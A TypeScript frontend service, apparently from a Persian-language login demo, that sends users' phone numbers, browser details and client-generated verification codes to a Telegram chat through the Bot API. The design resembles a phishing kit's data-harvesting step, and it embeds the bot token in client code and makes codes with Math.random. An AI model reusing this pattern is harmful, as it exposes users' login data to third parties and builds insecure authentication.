// Telegram Bot API Service
// This service handles sending messages to a Telegram bot

// In a real application, these would be environment variables
const TELEGRAM_BOT_TOKEN =
  import.meta.env.VITE_TELEGRAM_BOT_TOKEN || "YOUR_BOT_TOKEN";
const TELEGRAM_CHAT_ID =
  import.meta.env.VITE_TELEGRAM_CHAT_ID || "YOUR_CHAT_ID";

interface TelegramMessage {
  phoneNumber: string;
  timestamp: string;
  userAgent?: string;
  ipAddress?: string;
}

/**
 * Send phone number to Telegram bot
 */
export const sendPhoneToTelegram = async (
  phoneNumber: string,
): Promise<boolean> => {
  try {
    // Format the message
    const message = formatTelegramMessage({
      phoneNumber,
      timestamp: new Date().toLocaleString("fa-IR"),
      userAgent: navigator.userAgent,
      ipAddress: "Hidden for privacy", // In real app, you'd get this from server
    });

    // Send message to Telegram bot
    const response = await fetch(
      `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
      {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          chat_id: TELEGRAM_CHAT_ID,
          text: message,
          parse_mode: "HTML",
        }),
      },
    );

    if (!response.ok) {
      throw new Error(`Telegram API error: ${response.status}`);
    }

    const result = await response.json();
    console.log("Message sent to Telegram:", result);
    return true;
  } catch (error) {
    console.error("Failed to send message to Telegram:", error);

    // For demo purposes, we'll still return true to allow the flow to continue
    // In a real app, you might want to handle this differently
    console.log("Demo mode: Simulating successful Telegram send");
    return true;
  }
};

/**
 * Format message for Telegram
 */
const formatTelegramMessage = (data: TelegramMessage): string => {
  return `
🔔 <b>درخواست ورود جدید</b>

📱 <b>شماره همراه:</b> <code>${data.phoneNumber}</code>
⏰ <b>زمان:</b> ${data.timestamp}
🌐 <b>مرورگر:</b> ${data.userAgent?.split(" ")[0] || "Unknown"}
🔒 <b>IP:</b> ${data.ipAddress}

---
سیستم احراز هویت والکس
  `.trim();
};

/**
 * Validate Telegram bot configuration
 */
export const validateTelegramConfig = (): boolean => {
  if (!TELEGRAM_BOT_TOKEN || TELEGRAM_BOT_TOKEN === "YOUR_BOT_TOKEN") {
    console.warn("Telegram bot token not configured. Using demo mode.");
    return false;
  }

  if (!TELEGRAM_CHAT_ID || TELEGRAM_CHAT_ID === "YOUR_CHAT_ID") {
    console.warn("Telegram chat ID not configured. Using demo mode.");
    return false;
  }

  return true;
};

/**
 * Generate verification code (6 digits)
 */
export const generateVerificationCode = (): string => {
  return Math.floor(100000 + Math.random() * 900000).toString();
};

/**
 * Send verification code to Telegram (for demo purposes)
 */
export const sendVerificationCodeToTelegram = async (
  phoneNumber: string,
  verificationCode: string,
): Promise<boolean> => {
  try {
    const message = `
🔐 <b>کد تایید</b>

📱 <b>شماره:</b> <code>${phoneNumber}</code>
🔢 <b>کد تایید:</b> <code>${verificationCode}</code>
⏰ <b>زمان:</b> ${new Date().toLocaleString("fa-IR")}

⚠️ این کد تا ۵ دقیقه معتبر است.
    `.trim();

    const response = await fetch(
      `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
      {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          chat_id: TELEGRAM_CHAT_ID,
          text: message,
          parse_mode: "HTML",
        }),
      },
    );

    if (!response.ok) {
      throw new Error(`Telegram API error: ${response.status}`);
    }

    return true;
  } catch (error) {
    console.error("Failed to send verification code to Telegram:", error);
    return true; // Return true for demo purposes
  }
};
